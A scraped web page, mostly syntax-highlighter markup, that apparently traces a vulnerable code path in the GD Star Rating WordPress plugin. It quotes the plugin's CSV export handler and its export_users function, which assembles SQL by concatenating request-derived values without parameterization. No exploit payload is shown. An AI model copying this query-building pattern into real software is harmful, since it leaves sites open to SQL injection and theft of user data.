id="crayon-53c9878a6782e821015689-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-6"><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-8"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">"ex"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">export_type</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">"ex"</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">get_data</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">_GET</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-11">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">switch</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">export_type</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-s">"user"</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">export_name</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">export_type</span><span class="crayon-sy">.</span><span class="crayon-s">'_'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">"de"</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-s">"t2"</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">export_name</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'t2'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-s">"t2full"</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">export_name</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'t2_full'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-23">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">switch</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">export_type</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-s">"user"</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">values</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"us"</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"min"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"nor"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"de"</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"article"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"comment"</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-27">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">foreach</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-e">get_data </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">key</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">value</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">values</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-i">key</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">in_array</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">value</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">values</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-i">key</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-s">"invalid_request"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">key</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-s">"ex"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">value</span><span class="crayon-h"> </span><span class="crayon-o">!==</span><span class="crayon-h"> </span><span class="crayon-s">"on"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-s">"invalid_request"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-39">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-type: text/csv'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-Disposition: attachment; filename="gdsr_export_'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">export_name</span><span class="crayon-sy">.</span><span class="crayon-s">'.csv"'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-i">GDSRExport</span><span class="crayon-o">::</span><span class="crayon-e">export_users</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">"us"</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">"de"</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">get_data</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">rows</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_results</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">ARRAY_N</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-44"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">count</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">rows</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">foreach</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-e">rows </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">row</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'"'</span><span class="crayon-sy">.</span><span class="crayon-e">join</span><span class="crayon-sy">(</span><span class="crayon-s">'", "'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">row</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">'"'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-47"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\r\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-48"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-50"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0139 seconds] -->
<p>It calls into <a href="http://plugins.svn.wordpress.org/gd-star-rating/trunk/code/cls/export.php">/cls/export.php</a>s export_users function:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a6783f056596163" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function export_users($user_data = "min", $data_export = "article", $get_data = array()) {
    global $table_prefix;
    $columns = array();
    $select = array();
    $where = array();
    $tables = array();

    $tables[] = $table_prefix."gdsr_votes_log v";
    $tables[] = $table_prefix."users u";
    $tables[] = $table_prefix."posts p";
    $where[] = "v.vote_type = ''".$data_export."''";
    $where[] = "v.user_id = u.id";
    
    switch ($user_data) {
        case "min":
            $select[] = "u.id as user_id";
            $columns[] = "user_id";
            break;
        case "nor":
            $select[] = "u.id as user_id";
            $select[] = "u.display_name";
            $select[] = "u.user_email";
            $columns[] = "user_id";
            $columns[] = "user_name";
            $columns[] = "user_email";
            break;
    }
    
    $select[] = "p.id";
    $columns[] = "post_id";
    
    if ($get_data["pt"] == "on") {
        $select[] = "p.post_title";
        $columns[] = "post_title";
    }
    if ($get_data["pd"] == "on") {
        $select[] = "p.post_date";
        $columns[] = "post_date";
    }
    switch ($data_export) {
        case "article":
            $where[] = "v.id = p.id";
            break;
        case "comment":
            $select[] = "c.comment_id";
            $columns[] = "comment_id";
            $tables[] = $table_prefix."comments c";
            $where[] = "v.id = c.comment_id";
            $where[] = "p.id = c.comment_post_id";
            if ($get_data["ca"] == "on") {
                $select[] = "c.comment_author";
                $columns[] = "comment_author";
            }
            if ($get_data["cd"] == "on") {
                $select[] = "c.comment_date";
                $columns[] = "comment_date";
            }
            break;
    }        
    
    $select[] = "v.vote";
    $select[] = "v.voted";
    $columns[] = "vote";
    $columns[] = "vote_date";
    
    if ($get_data["ip"] == "on") {
        $select[] = "v.ip";
        $columns[] = "ip";
    }
    if ($get_data["ua"] == "on") {
        $select[] = "v.user_agent";
        $columns[] = "user_agent";
    }
    
    echo join(", ", $columns)."\r\n";
    $j_select = join(", ", $select);
    $j_where = join(" and ", $where);
    $j_tables = join(", ", $tables);
    
    return sprintf("select %s from %s where %s order by u.id", $j_select, $j_tables, $j_where);
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-2">2</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-4">4</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-6">6</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-8">8</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-10">10</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-12">12</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-14">14</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-16">16</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-18">18</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-20">20</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-22">22</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-24">24</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-26">26</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-28">28</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-30">30</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-32">32</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-34">34</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-36">36</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-38">38</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-40">40</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-42">42</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-44">44</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-46">46</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-48">48</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-50">50</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-52">52</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-54">54</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-56">56</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-58">58</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-60">60</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-62">62</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-64">64</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-65">65</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-66">66</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-67">67</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-68">68</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-69">69</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-70">70</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-71">71</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-72">72</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-73">73</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-74">74</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-75">75</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-76">76</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-77">77</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-78">78</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-79">79</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6783f056596163-80">80</div><div class="crayon-num" data-line="crayon-53c9878a6783f056596163-81">81</div></div>
				</td>
